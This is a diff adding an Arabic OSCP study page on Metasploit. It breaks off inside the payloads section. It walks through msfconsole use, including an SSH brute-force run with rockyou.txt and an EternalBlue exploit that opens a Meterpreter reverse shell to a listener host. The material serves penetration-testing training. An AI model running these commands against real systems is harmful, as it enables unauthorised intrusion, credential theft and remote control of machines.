@@ -1,0 +1,1066 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>OSCP · Module 18: إطار عمل Metasploit</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&family=IBM+Plex+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+<style>
+  :root{
+    --bg-0:#0B0B0D;--bg-1:#121214;--surface:#17171A;--surface-2:#1D1D21;
+    --border:#2A2A2F;--border-soft:#232326;
+    --text:#E6E6E9;--text-soft:#C4C4CA;--muted:#8A8A92;
+    --red:#E1362F;--red-soft:rgba(225,54,47,.10);--red-border:rgba(225,54,47,.35);
+    --red-grad:linear-gradient(90deg,#E1362F,#F2794A);
+    --amber:#E8A23A;--amber-soft:rgba(232,162,58,.09);--amber-border:rgba(232,162,58,.30);
+    --green:#3FBF6E;--green-soft:rgba(63,191,110,.09);--green-border:rgba(63,191,110,.30);
+    --blue:#4EA1D3;--blue-soft:rgba(78,161,211,.09);--blue-border:rgba(78,161,211,.30);
+    --purple:#A179E8;--purple-soft:rgba(161,121,232,.10);--purple-border:rgba(161,121,232,.32);
+    --mono:'IBM Plex Mono','Courier New',monospace;
+  }
+  html[data-theme="light"]{--bg-0:#F4F3F1;--bg-1:#ECEBE8;--surface:#FFFFFF;--surface-2:#F3F2EF;--border:#DEDCD6;--border-soft:#E6E4DF;--text:#1C1B19;--text-soft:#3C3A36;--muted:#726F68;}
+  *{box-sizing:border-box;}
+  html,body{margin:0;padding:0;direction:rtl;text-align:right;background:var(--bg-0);}
+  body{font-family:'Cairo','Segoe UI',Tahoma,sans-serif;line-height:1.95;font-size:16.5px;color:var(--text);
+    background:radial-gradient(900px 420px at 12% -8%,rgba(225,54,47,.10),transparent 60%),
+               radial-gradient(800px 420px at 90% 6%,rgba(232,162,58,.06),transparent 60%),
+               linear-gradient(180deg,var(--bg-0) 0%,var(--bg-1) 100%);
+    background-attachment:fixed;transition:background .2s,color .2s;}
+  html[data-theme="light"] body{background:radial-gradient(900px 420px at 12% -8%,rgba(225,54,47,.06),transparent 60%),radial-gradient(800px 420px at 90% 6%,rgba(232,162,58,.05),transparent 60%),linear-gradient(180deg,var(--bg-0) 0%,var(--bg-1) 100%);}
+  .progress-rail{position:fixed;top:0;inset-inline:0;height:3px;background:rgba(255,255,255,.04);z-index:60;}
+  html[data-theme="light"] .progress-rail{background:rgba(0,0,0,.05);}
+  .progress-bar{height:100%;width:0%;background:var(--red-grad);transition:width .08s linear;}
+  .float-controls{position:fixed;bottom:22px;left:22px;z-index:55;display:flex;flex-direction:column;gap:10px;}
+  .fctrl-btn{width:42px;height:42px;border-radius:50%;background:var(--surface);border:1px solid var(--border);color:var(--text-soft);display:flex;align-items:center;justify-content:center;cursor:pointer;font-size:16px;box-shadow:0 10px 24px -10px rgba(0,0,0,.5);transition:transform .15s,border-color .15s,opacity .2s;}
+  .fctrl-btn:hover{transform:translateY(-2px);border-color:var(--red-border);color:var(--red);}
+  #toTop{opacity:0;pointer-events:none;}
+  #toTop.show{opacity:1;pointer-events:auto;}
+  .page{max-width:860px;margin:0 auto;padding:46px 22px 100px;}
+  .banner{position:relative;overflow:hidden;background:linear-gradient(155deg,var(--surface) 0%,var(--bg-1) 55%,var(--surface) 100%);border:1px solid var(--border-soft);border-radius:10px;padding:0 0 34px;margin-bottom:26px;box-shadow:0 20px 50px -20px rgba(0,0,0,.6);}
+  .term-bar{display:flex;align-items:center;gap:8px;padding:13px 18px;border-bottom:1px solid var(--border-soft);background:rgba(255,255,255,.015);direction:ltr;}
+  .term-dot{width:11px;height:11px;border-radius:50%;display:inline-block;}
+  .term-dot.r{background:#E1362F;}.term-dot.y{background:#E8A23A;}.term-dot.g{background:#3FBF6E;}
+  .term-path{margin-inline-start:12px;font-family:var(--mono);font-size:12px;color:var(--muted);}
+  .theme-switch{margin-inline-start:auto;font-family:var(--mono);font-size:11px;color:var(--muted);background:transparent;border:1px solid var(--border);border-radius:4px;padding:4px 9px;cursor:pointer;}
+  .theme-switch:hover{color:var(--amber);border-color:var(--amber-border);}
+  .banner-body{padding:30px 34px 4px;}
+  .banner .kicker{display:inline-block;font-family:var(--mono);font-size:12.5px;letter-spacing:.03em;color:var(--red);background:var(--red-soft);border:1px solid var(--red-border);border-radius:3px;padding:5px 12px;margin-bottom:20px;direction:ltr;}
+  .banner h1{margin:0 0 14px;font-size:28px;font-weight:800;line-height:1.5;color:var(--text);}
+  .banner .lede{color:var(--muted);font-size:15.5px;line-height:1.95;max-width:640px;margin:0 0 24px;}
+  .tags{display:flex;flex-wrap:wrap;gap:9px;}
+  .tag{font-size:12.5px;font-family:var(--mono);color:var(--amber);background:var(--amber-soft);border:1px solid var(--amber-border);border-radius:3px;padding:5px 11px;}
+  .toc{background:var(--surface);border:1px solid var(--border-soft);border-radius:8px;padding:6px 0;margin-bottom:50px;overflow:hidden;}
+  .toc-title{font-family:var(--mono);font-weight:600;font-size:13px;color:var(--green);padding:14px 22px;border-bottom:1px solid var(--border-soft);direction:ltr;text-align:left;}
+  .toc-list{display:flex;flex-direction:column;}
+  .toc-item{display:flex;align-items:center;gap:14px;padding:12px 22px;color:var(--text-soft);text-decoration:none;font-size:14.5px;border-bottom:1px solid rgba(255,255,255,.03);transition:background .15s;}
+  .toc-list .toc-item:last-child{border-bottom:none;}
+  .toc-item:hover{background:var(--red-soft);}
+  .toc-num{flex:none;font-family:var(--mono);font-size:12.5px;font-weight:600;color:#0F0F10;background:var(--red-grad);border-radius:3px;padding:3px 8px;direction:ltr;}
+  h1,h2,h3,h4{font-weight:700;}
+  h2{display:flex;align-items:center;gap:14px;font-size:21px;margin:66px 0 22px;padding-bottom:16px;border-bottom:1px solid var(--border-soft);color:var(--text);}
+  h2 .num{flex:none;font-family:var(--mono);font-size:13px;font-weight:700;color:#0F0F10;background:var(--red-grad);border-radius:5px;padding:7px 12px;direction:ltr;}
+  h2 .htext{line-height:1.5;}
+  h3{font-size:17px;margin:34px 0 14px;color:var(--red);display:flex;align-items:center;gap:9px;}
+  h3::before{content:"#";font-family:var(--mono);color:var(--amber);font-weight:700;}
+  h4{font-size:14.8px;margin:22px 0 10px;color:var(--text-soft);font-family:var(--mono);}
+  p{margin:0 0 17px;color:var(--text);}
+  strong{color:var(--text);font-weight:700;}
+  :root:not([data-theme="light"]) strong{color:#FBFBFC;}
+  a{color:var(--amber);text-decoration:none;border-bottom:1px dashed var(--amber-border);}
+  hr{border:none;height:1px;margin:50px 0;background:linear-gradient(90deg,transparent,var(--border),transparent);}
+  ul,ol{margin:0 0 18px;padding-inline-start:24px;}
+  li{margin-bottom:9px;color:var(--text);}
+  li::marker{color:var(--red);font-family:var(--mono);}
+  .goals-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(230px,1fr));gap:10px;margin:0 0 22px;}
+  .goal-card{display:flex;gap:10px;align-items:flex-start;background:var(--surface);border:1px solid var(--border-soft);border-radius:7px;padding:13px 15px;font-size:14px;color:var(--text-soft);}
+  .goal-card .gi{flex:none;font-family:var(--mono);font-size:11px;font-weight:700;color:var(--green);background:var(--green-soft);border:1px solid var(--green-border);border-radius:4px;width:22px;height:22px;display:flex;align-items:center;justify-content:center;}
+  blockquote{margin:24px 0;padding:17px 22px;background:var(--red-soft);border:1px solid var(--red-border);border-inline-start:3px solid var(--red);border-radius:6px;color:var(--text-soft);}
+  blockquote p{margin:0;color:inherit;line-height:1.85;}
+  blockquote p+p{margin-top:10px;}
+  blockquote strong{color:var(--text);}
+  .callout{margin:24px 0;padding:17px 22px 18px;border-radius:6px;border:1px solid var(--border-soft);border-inline-start:3px solid var(--border);background:var(--surface);}
+  .callout p{margin:0;color:var(--text-soft);line-height:1.85;}
+  .callout p+p{margin-top:10px;}
+  .callout-label{display:inline-flex;align-items:center;gap:7px;font-family:var(--mono);font-size:11.5px;font-weight:700;letter-spacing:.02em;text-transform:uppercase;margin-bottom:10px;direction:ltr;}
+  .callout.note{border-inline-start-color:var(--blue);background:var(--blue-soft);}
+  .callout.note .callout-label{color:var(--blue);}
+  .callout.warning{border-inline-start-color:var(--red);background:var(--red-soft);}
+  .callout.warning .callout-label{color:var(--red);}
+  .callout.tip{border-inline-start-color:var(--green);background:var(--green-soft);}
+  .callout.tip .callout-label{color:var(--green);}
+  .callout.examtip{border-inline-start-color:var(--purple);background:var(--purple-soft);}
+  .callout.examtip .callout-label{color:var(--purple);}
+  .callout.case{border-inline-start-color:var(--amber);background:var(--amber-soft);}
+  .callout.case .callout-label{color:var(--amber);}
+  .callout.definition{border-inline-start-color:var(--muted);background:var(--surface-2);}
+  .callout.definition .callout-label{color:var(--text-soft);}
+  .callout.danger{border-inline-start-color:#FF5A52;background:rgba(255,90,82,.08);}
+  .callout.danger .callout-label{color:#FF5A52;}
+  .table-wrap{overflow-x:auto;margin:22px 0;border:1px solid var(--border-soft);border-radius:8px;}
+  table{width:100%;border-collapse:collapse;font-size:14.2px;min-width:480px;}
+  thead th{background:var(--surface-2);color:var(--amber);font-weight:700;font-family:var(--mono);font-size:12.5px;text-transform:uppercase;letter-spacing:.02em;text-align:start;padding:13px 15px;border-bottom:1px solid var(--border-soft);white-space:nowrap;}
+  tbody td{padding:12px 15px;border-bottom:1px solid var(--border-soft);color:var(--text-soft);vertical-align:top;}
+  tbody tr:last-child td{border-bottom:none;}
+  tbody tr:nth-child(even){background:rgba(127,127,127,.03);}
+  tbody tr:hover{background:var(--red-soft);}
+  code{font-family:var(--mono);font-size:13.3px;background:var(--surface-2);border:1px solid var(--border-soft);border-radius:4px;padding:2px 6px;direction:ltr;unicode-bidi:embed;color:var(--green);}
+  .code-wrap{position:relative;overflow-x:auto;margin:22px 0;}
+  .code-tag{position:absolute;top:10px;left:14px;font-family:var(--mono);font-size:10.5px;color:var(--muted);letter-spacing:.04em;text-transform:uppercase;z-index:2;}
+  .copy-btn{position:absolute;top:8px;right:10px;z-index:2;font-family:var(--mono);font-size:11px;color:var(--muted);background:var(--surface-2);border:1px solid var(--border-soft);border-radius:4px;padding:4px 9px;cursor:pointer;direction:ltr;}
+  .copy-btn:hover{color:var(--amber);border-color:var(--amber-border);}
+  .copy-btn.copied{color:var(--green);border-color:var(--green-border);}
+  pre{background:var(--bg-0);border:1px solid var(--border-soft);border-inline-start:3px solid var(--red);border-radius:8px;padding:30px 22px 18px;direction:ltr;text-align:left;margin:0;}
+  html[data-theme="light"] pre{background:#16181C;}
+  pre code{background:none;border:none;padding:0;color:#B9E8C9;font-size:13.2px;line-height:1.75;}
+  .diagram-card{background:var(--surface);border:1px solid var(--border-soft);border-radius:10px;padding:22px 18px 16px;margin:24px 0;}
+  .diagram-card svg{width:100%;height:auto;display:block;}
+  .diagram-caption{margin-top:10px;text-align:center;font-family:var(--mono);font-size:11.5px;color:var(--muted);}
+  .takeaways{background:var(--surface);border:1px solid var(--border-soft);border-radius:8px;padding:18px 22px 20px;margin:30px 0 10px;}
+  .takeaways-title{font-family:var(--mono);font-size:12.5px;font-weight:700;color:var(--green);margin-bottom:12px;direction:ltr;text-align:left;display:flex;align-items:center;gap:8px;}
+  .takeaways ul{margin:0;padding-inline-start:20px;}
+  .takeaways li{color:var(--text-soft);font-size:14.5px;}
+  .cheat-section h4{color:var(--amber);font-size:13px;margin:26px 0 8px;}
+  .step-track{display:flex;flex-direction:column;gap:0;margin:24px 0;}
+  .step-item{position:relative;padding:0 0 26px 0;padding-inline-start:46px;border-inline-start:2px solid var(--border-soft);}
+  .step-item:last-child{border-inline-start:2px solid transparent;padding-bottom:4px;}
+  .step-num{position:absolute;inset-inline-start:-17px;top:0;width:32px;height:32px;border-radius:50%;background:var(--red-grad);color:#0F0F10;font-family:var(--mono);font-weight:700;font-size:13px;display:flex;align-items:center;justify-content:center;}
+  .step-title{font-weight:700;color:var(--text);margin-bottom:6px;font-size:15px;}
+  .step-body{color:var(--text-soft);font-size:14.5px;}
+  .step-body p{margin:0 0 10px;}
+  .step-body p:last-child{margin-bottom:0;}
+  .method-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(240px,1fr));gap:10px;margin:22px 0;}
+  .method-card{background:var(--surface);border:1px solid var(--border-soft);border-radius:8px;padding:14px 16px;}
+  .method-card .mnum{font-family:var(--mono);font-size:11px;font-weight:700;color:#0F0F10;background:var(--red-grad);border-radius:4px;padding:2px 8px;display:inline-block;margin-bottom:8px;direction:ltr;}
+  .method-card .mtitle{font-weight:700;color:var(--text);font-size:14px;margin-bottom:5px;}
+  .method-card .mdesc{color:var(--text-soft);font-size:13.3px;line-height:1.75;}
+  .footer-note{margin-top:70px;padding-top:26px;border-top:1px solid var(--border-soft);color:var(--muted);font-size:13.3px;font-family:var(--mono);text-align:center;direction:ltr;}
+  .dsvg-box{fill:var(--surface-2);stroke:var(--border-soft);stroke-width:1;}
+  .dsvg-box-r{fill:var(--red-soft);stroke:var(--red-border);stroke-width:1;}
+  .dsvg-box-g{fill:var(--green-soft);stroke:var(--green-border);stroke-width:1;}
+  .dsvg-box-b{fill:var(--blue-soft);stroke:var(--blue-border);stroke-width:1;}
+  .dsvg-box-a{fill:var(--amber-soft);stroke:var(--amber-border);stroke-width:1;}
+  .dsvg-box-p{fill:var(--purple-soft);stroke:var(--purple-border);stroke-width:1;}
+  .dsvg-line{stroke:var(--border);stroke-width:1.5;fill:none;}
+  .dsvg-line-g{stroke:var(--green);stroke-width:1.5;fill:none;}
+  .dsvg-line-b{stroke:var(--blue);stroke-width:1.5;fill:none;}
+  .dsvg-arr{fill:var(--border);}
+  .dsvg-arr-g{fill:var(--green);}
+  .dsvg-arr-b{fill:var(--blue);}
+  .dsvg-txt{fill:var(--text);font-family:IBM Plex Mono,monospace;}
+  .dsvg-muted{fill:var(--muted);font-family:IBM Plex Mono,monospace;}
+  .dsvg-red{fill:var(--red);}
+  .dsvg-green{fill:var(--green);}
+  .dsvg-amber{fill:var(--amber);}
+  .dsvg-blue{fill:var(--blue);}
+  @media print{.float-controls,.progress-rail,.copy-btn,.theme-switch{display:none !important;}body{background:#fff;color:#000;}.page{max-width:100%;}}
+  @media(max-width:640px){.page{padding:28px 14px 70px;}.banner-body{padding:24px 20px 4px;}.banner h1{font-size:21px;}h2{font-size:18px;gap:10px;}.float-controls{left:12px;bottom:14px;}}
+</style>
+</head>
+<body>
+
+<div class="progress-rail"><div class="progress-bar" id="progressBar"></div></div>
+<div class="float-controls"><button class="fctrl-btn" id="toTop" title="ارجع لفوق">↑</button></div>
+
+<div class="page">
+
+<div class="banner">
+  <div class="term-bar">
+    <span class="term-dot r"></span><span class="term-dot y"></span><span class="term-dot g"></span>
+    <span class="term-path">root@oscp:~/module-18$</span>
+    <button class="theme-switch" id="themeSwitch">theme: dark</button>
+  </div>
+  <div class="banner-body">
+    <span class="kicker">OSCP · PEN-200 · Module 18</span>
+    <h1>إطار عمل Metasploit (The Metasploit Framework)</h1>
+    <p class="lede">من الاستكشاف للاستغلال لما بعد الاختراق — كل المراحل في Console واحد. Auxiliary وExploit وPayloads وMeterpreter والـ Pivoting والأتمتة بـ Resource Scripts.</p>
+    <div class="tags">
+      <span class="tag">msfconsole</span>
+      <span class="tag">meterpreter</span>
+      <span class="tag">msfvenom</span>
+      <span class="tag">eternalblue</span>
+      <span class="tag">kiwi</span>
+      <span class="tag">autoroute</span>
+      <span class="tag">post-exploitation</span>
+      <span class="tag">pivoting</span>
+    </div>
+  </div>
+</div>
+
+<nav class="toc"><div class="toc-title">$ ls learning_units/</div><div class="toc-list">
+  <a class="toc-item" href="#intro"><span class="toc-num">00</span><span>مقدمة — ليه Exploit Frameworks؟ وتاريخ MSF</span></a>
+  <a class="toc-item" href="#lu1"><span class="toc-num">01</span><span>الإعداد — PostgreSQL وWorkspaces وNavigation</span></a>
+  <a class="toc-item" href="#lu2"><span class="toc-num">02</span><span>Auxiliary Modules — Scanning وCredential Attacks</span></a>
+  <a class="toc-item" href="#lu3"><span class="toc-num">03</span><span>Exploit Modules — البحث والتقييم وEternalBlue والـ Sessions</span></a>
+  <a class="toc-item" href="#lu4"><span class="toc-num">04</span><span>Payloads ومsfvenom — Staged vs Non-Staged وMeterpreter</span></a>
+  <a class="toc-item" href="#lu5"><span class="toc-num">05</span><span>Post-Exploitation — Meterpreter وUAC Bypass وKiwi</span></a>
+  <a class="toc-item" href="#lu6"><span class="toc-num">06</span><span>Pivoting — Routes وSOCKS وPort Forwarding</span></a>
+  <a class="toc-item" href="#lu7"><span class="toc-num">07</span><span>Automation — Resource Scripts وأمن العمليات</span></a>
+  <a class="toc-item" href="#cheat"><span class="toc-num">--</span><span>Cheat Sheet مرجعي</span></a>
+  <a class="toc-item" href="#summary"><span class="toc-num">--</span><span>الخلاصة العامة للموديول</span></a>
+</div></nav>
+
+<!-- ══════════════════════════════════ INTRO -->
+<h1 id="intro">Module 18: إطار عمل Metasploit</h1>
+<p>Exploit Frameworks وُجدت لحل مشكلة حقيقية: الـ Exploits الخام متفرّقة وبتحتاج تعديل ثقيل لكل هدف، والـ Post-Exploitation يحتاج جمع أدوات كثيرة. MSF حلَّت كل ده في Console واحد.</p>
+
+<h3>أنواع موديولات Metasploit</h3>
+<div class="diagram-card">
+<svg viewBox="0 0 700 160" xmlns="http://www.w3.org/2000/svg">
+  <rect x="8"   y="10" width="108" height="65" rx="7" class="dsvg-box-b"/>
+  <text x="62"  y="34" text-anchor="middle" class="dsvg-blue" font-size="11" font-weight="700">auxiliary</text>
+  <text x="62"  y="50" text-anchor="middle" class="dsvg-muted" font-size="9">Scanning, Fuzzing</text>
+  <text x="62"  y="64" text-anchor="middle" class="dsvg-muted" font-size="9">Cred Attacks</text>
+
+  <rect x="126" y="10" width="108" height="65" rx="7" class="dsvg-box-r"/>
+  <text x="180" y="34" text-anchor="middle" class="dsvg-red" font-size="11" font-weight="700">exploit</text>
+  <text x="180" y="50" text-anchor="middle" class="dsvg-muted" font-size="9">CVE exploitation</text>
+  <text x="180" y="64" text-anchor="middle" class="dsvg-muted" font-size="9">Code execution</text>
+
+  <rect x="244" y="10" width="108" height="65" rx="7" class="dsvg-box-a"/>
+  <text x="298" y="34" text-anchor="middle" class="dsvg-amber" font-size="11" font-weight="700">payload</text>
+  <text x="298" y="50" text-anchor="middle" class="dsvg-muted" font-size="9">What runs after</text>
+  <text x="298" y="64" text-anchor="middle" class="dsvg-muted" font-size="9">exploitation</text>
+
+  <rect x="362" y="10" width="108" height="65" rx="7" class="dsvg-box-g"/>
+  <text x="416" y="34" text-anchor="middle" class="dsvg-green" font-size="11" font-weight="700">post</text>
+  <text x="416" y="50" text-anchor="middle" class="dsvg-muted" font-size="9">Post-exploitation</text>
+  <text x="416" y="64" text-anchor="middle" class="dsvg-muted" font-size="9">on live sessions</text>
+
+  <rect x="480" y="10" width="108" height="65" rx="7" class="dsvg-box-p"/>
+  <text x="534" y="34" text-anchor="middle" font-size="11" font-weight="700" style="fill:var(--purple)">encoder</text>
+  <text x="534" y="50" text-anchor="middle" class="dsvg-muted" font-size="9">Obfuscate payloads</text>
+  <text x="534" y="64" text-anchor="middle" class="dsvg-muted" font-size="9">Evade signatures</text>
+
+  <rect x="598" y="10" width="94" height="65" rx="7" class="dsvg-box"/>
+  <text x="645" y="34" text-anchor="middle" class="dsvg-muted" font-size="11" font-weight="700">nop</text>
+  <text x="645" y="50" text-anchor="middle" class="dsvg-muted" font-size="9">NOP sleds</text>
+  <text x="645" y="64" text-anchor="middle" class="dsvg-muted" font-size="9">Buffer padding</text>
+
+  <!-- Directory structure -->
+  <rect x="8" y="90" width="684" height="60" rx="7" class="dsvg-box"/>
+  <text x="350" y="110" text-anchor="middle" class="dsvg-amber" font-size="10" font-weight="700">📁 /usr/share/metasploit-framework/</text>
+  <text x="130" y="130" text-anchor="middle" class="dsvg-muted" font-size="9">modules/ → كل الأنواع</text>
+  <text x="270" y="130" text-anchor="middle" class="dsvg-muted" font-size="9">scripts/ → Resource scripts</text>
+  <text x="410" y="130" text-anchor="middle" class="dsvg-muted" font-size="9">tools/ → msfvenom &amp; utils</text>
+  <text x="560" y="130" text-anchor="middle" class="dsvg-muted" font-size="9">data/ → Wordlists, templates</text>
+</svg>
+<div class="diagram-caption">Module naming: &lt;category&gt;/&lt;platform&gt;/&lt;subcategory&gt;/&lt;name&gt; — مثال: exploit/windows/smb/ms17_010_eternalblue</div>
+</div>
+
+<div class="callout note">
+<div class="callout-label">📌 تاريخ MSF</div>
+<p>أسَّسه H.D. Moore عام 2003 كلعبة شبكية — تطوَّر بسرعة ليصبح Framework الاختراق الأوسع انتشاراً. Rapid7 استحوذت عليه عام 2009. ثلاث إصدارات: <strong>MSF Framework</strong> (مفتوح المصدر، CLI، في Kali) — <strong>MSF Pro</strong> (تجاري، Web UI) — <strong>MSF Community</strong> (مجاني محدود). المنافسون التجاريون: Cobalt Strike، Covenant، PowerShell Empire.</p>
+</div>
+
+<hr />
+
+<!-- ══════════════════════════════════ LU1 -->
+<h2 id="lu1"><span class="num">01</span><span class="htext">الإعداد — PostgreSQL وWorkspaces وNavigation</span></h2>
+
+<h3>إعداد قاعدة البيانات والبدء</h3>
+<p>MSF ممكن يشتغل بدون DB لكن يُنصَح به بشدة — بيخزَّن: Hosts, Services, Vulns, Credentials, Loot, Notes. بدونه هتفقد التكامل بين الفحص والاستغلال.</p>
+<div class="code-wrap"><span class="code-tag">bash — msfdb setup</span><pre><code># تهيئة DB (مرة واحدة فقط)
+sudo msfdb init
+
+# تشغيل MSFconsole
+sudo msfconsole
+
+# التحقق من الاتصال بالـ DB
+msf6 > db_status
+# [*] Connected to msf. Connection type: postgresql
+
+# ===== Workspaces =====
+workspace              # عرض كل الـ Workspaces
+workspace -a client1   # إنشاء وتبديل لـ Workspace جديد
+workspace client1      # التبديل لـ Workspace موجود
+workspace -d client1   # حذف Workspace
+</code></pre></div>
+
+<h3>MSFconsole — الأوامر الأساسية</h3>
+<div class="table-wrap"><table>
+<thead><tr><th>الأمر</th><th>الوظيفة</th></tr></thead>
+<tbody>
+<tr><td><code>help</code> / <code>?</code></td><td>عرض كل الأوامر المتاحة في السياق الحالي</td></tr>
+<tr><td><code>search &lt;term&gt;</code></td><td>بحث في الموديولات بالاسم أو CVE أو Platform أو Type</td></tr>
+<tr><td><code>use &lt;module&gt;</code></td><td>تحميل وتحديد موديول للعمل عليه</td></tr>
+<tr><td><code>info</code></td><td>عرض التوثيق الكامل للموديول المحمَّل</td></tr>
+<tr><td><code>show options</code></td><td>عرض الـ Parameters المطلوبة والاختيارية</td></tr>
+<tr><td><code>set &lt;OPT&gt; &lt;val&gt;</code></td><td>تعيين قيمة Option للموديول الحالي</td></tr>
+<tr><td><code>setg &lt;OPT&gt; &lt;val&gt;</code></td><td>تعيين قيمة Global تنطبق على كل الموديولات</td></tr>
+<tr><td><code>unset &lt;OPT&gt;</code></td><td>إلغاء تعيين Option</td></tr>
+<tr><td><code>run</code> / <code>exploit</code></td><td>تشغيل الموديول المحمَّل</td></tr>
+<tr><td><code>back</code></td><td>الرجوع للـ Context السابق</td></tr>
+</tbody>
+</table></div>
+
+<h3>إدارة الـ DB وقواعد البيانات</h3>
+<div class="code-wrap"><span class="code-tag">msfconsole — db commands</span><pre><code># فحص Nmap وحفظ النتائج في DB
+db_nmap -sV -p 1-1000 192.168.50.0/24
+
+# الاستعلام عن النتائج المخزَّنة
+hosts                          # كل الـ Hosts
+hosts -R                       # ملء RHOSTS تلقائياً من الـ DB
+services -p 445                # خدمات على بورت 445
+services -p 22 -R              # تعيين RHOSTS من الخدمات على 22
+creds                          # بيانات الاعتماد المجمَّعة
+loot                           # الملفات والبيانات المستخرَجة
+notes                          # الملاحظات المحفوظة
+vulns                          # الثغرات المُحدَّدة
+
+# تصدير البيانات
+db_export -f xml /tmp/engagement.xml
+</code></pre></div>
+
+<hr />
+
+<!-- ══════════════════════════════════ LU2 -->
+<h2 id="lu2"><span class="num">02</span><span class="htext">Auxiliary Modules — Scanning وCredential Attacks</span></h2>
+
+<p>Auxiliary Modules مش بتستغل ثغرات — بتدعم مراحل الـ Recon والـ Enumeration وهجمات بيانات الاعتماد. بتشتغل بدون Payload.</p>
+
+<div class="table-wrap"><table>
+<thead><tr><th>الموديول</th><th>الوظيفة</th></tr></thead>
+<tbody>
+<tr><td><code>scanner/portscan/tcp</code></td><td>TCP Port Scanner أساسي</td></tr>
+<tr><td><code>scanner/smb/smb_version</code></td><td>كشف إصدار SMB ونظام التشغيل والـ Hostname — ضروري لاستهداف EternalBlue</td></tr>
+<tr><td><code>scanner/smb/smb_ms17_010</code></td><td>فحص ثغرة MS17-010 فقط — بدون استغلال</td></tr>
+<tr><td><code>scanner/ssh/ssh_version</code></td><td>بصمة إصدار SSH والـ Algorithms المدعومة</td></tr>
+<tr><td><code>scanner/ssh/ssh_login</code></td><td>Dictionary/Brute-Force على SSH</td></tr>
+<tr><td><code>scanner/ftp/ftp_login</code></td><td>Dictionary/Brute-Force على FTP</td></tr>
+<tr><td><code>scanner/http/http_version</code></td><td>تعريف Web Server وإصداره</td></tr>
+</tbody>
+</table></div>
+
+<div class="code-wrap"><span class="code-tag">msfconsole — smb scanner</span><pre><code># Workflow أي auxiliary module:
+# search → use → info → show options → set → run
+
+# البحث عن موديولات SMB
+search type:auxiliary name:smb
+
+# تحميل SMB Version Scanner
+use auxiliary/scanner/smb/smb_version
+show options
+set RHOSTS 192.168.50.0/24
+set THREADS 20
+run
+# النتائج تُحفَظ تلقائياً في DB
+services -p 445  # استعراض النتائج
+
+# ===== SSH Credential Attack =====
+use auxiliary/scanner/ssh/ssh_login
+set RHOSTS 192.168.50.10
+set USER_FILE /usr/share/wordlists/users.txt
+set PASS_FILE /usr/share/wordlists/rockyou.txt
+set STOP_ON_SUCCESS true
+set THREADS 5
+run
+# [+] SSH - Success: 'admin:password123'
+# [*] Command shell session 1 opened
+creds  # بيانات الاعتماد تُحفَظ تلقائياً
+</code></pre></div>
+
+<hr />
+
+<!-- ══════════════════════════════════ LU3 -->
+<h2 id="lu3"><span class="num">03</span><span class="htext">Exploit Modules — البحث والتقييم وEternalBlue والـ Sessions</span></h2>
+
+<h3>تصنيفات Exploit Rank</h3>
+<div class="table-wrap"><table>
+<thead><tr><th>الـ Rank</th><th>المعنى</th><th>التوصية</th></tr></thead>
+<tbody>
+<tr><td><code>Excellent</code></td><td>موثوق جداً، بدون آثار جانبية</td><td>✓ الأفضل — استخدمه أولاً</td></tr>
+<tr><td><code>Great</code></td><td>موثوق على معظم الأهداف</td><td>✓ جيد جداً</td></tr>
+<tr><td><code>Good</code></td><td>يعمل مع احتمال مشاكل طفيفة</td><td>🟡 اختبر في Lab</td></tr>
+<tr><td><code>Normal</code></td><td>يحتاج شروطاً محدَّدة</td><td>🟡 تحقَّق من المتطلبات</td></tr>
+<tr><td><code>Low</code></td><td>ممكن يكرَّس الخدمة</td><td>⚠ تحذير — آثار جانبية</td></tr>
+<tr><td><code>Manual</code></td><td>يحتاج تدخُّل يدوي كامل</td><td>للمتقدّمين فقط</td></tr>
+</tbody>
+</table></div>
+
+<div class="code-wrap"><span class="code-tag">msfconsole — finding exploits</span><pre><code># بحث بالـ CVE
+search CVE-2017-0144
+
+# بحث بالنوع والمنصة
+search type:exploit platform:windows name:smb
+
+# بحث بالـ Rank
+search type:exploit rank:excellent
+
+# بعد العثور على الموديول
+use exploit/windows/smb/ms17_010_eternalblue
+info          # اقرأ التوثيق الكامل
+show options  # شوف المتطلبات
+</code></pre></div>
+
+<h3>MS17-010 EternalBlue — الاستغلال الكلاسيكي</h3>
+<div class="callout case">
+<div class="callout-label">⚙ CVE-2017-0144 — EternalBlue</div>
+<p>SMBv1 Buffer Overflow في Windows — مسرَّب من NSA (Shadow Brokers). يصيب: XP, Vista, 7, 8.1, Server 2003-2016 (غير مُرقَّع). استُخدم في WannaCry وNotPetya. النتيجة: SYSTEM shell — أعلى امتيازات Windows.</p>
+</div>
+
+<div class="code-wrap"><span class="code-tag">msfconsole — eternalblue</span><pre><code># الخطوة 1: فحص الثغرة (بدون استغلال)
+use auxiliary/scanner/smb/smb_ms17_010
+set RHOSTS 192.168.50.10
+run
+# [+] 192.168.50.10 - Host is likely VULNERABLE to MS17-010!
+
+# الخطوة 2: تحميل الـ Exploit
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS 192.168.50.10
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set LHOST 192.168.118.4
+set LPORT 4444
+run
+# [*] Meterpreter session 1 opened
+</code></pre></div>
+
+<h3>إدارة الـ Sessions</h3>
+<div class="callout warning">
+<div class="callout-label">⚠ Background أولاً</div>
+<p>دايماً Background الـ Session قبل تشغيل Post Modules — تشغيل موديول على Session في الـ Foreground سيحجب الـ Console.</p>
+</div>
+<div class="code-wrap"><span class="code-tag">msfconsole — session management</span><pre><code">sessions            # عرض كل الـ Sessions النشطة
+sessions -i 1       # التفاعل مع Session رقم 1
+sessions -k 1       # إنهاء Session رقم 1
+sessions -K         # إنهاء كل الـ Sessions
+sessions -u 1       # Upgrade Shell لـ Meterpreter
+
+# من داخل Session:
+background          # إرسال للخلفية
+bg                  # نفس الأمر
+# Ctrl+Z            # نفس الأمر (Keyboard)
+</code></pre></div>
+
+<hr />
+
+<!-- ══════════════════════════════════ LU4 -->
+<h2 id="lu4"><span class="num">04</span><span class="htext">Payloads ومsfvenom — Staged vs Non-Staged وMeterpreter</span></h2>
+
+<h3>Staged vs Non-Staged — الفرق الجوهري</h3>
+<div class="diagram-card">
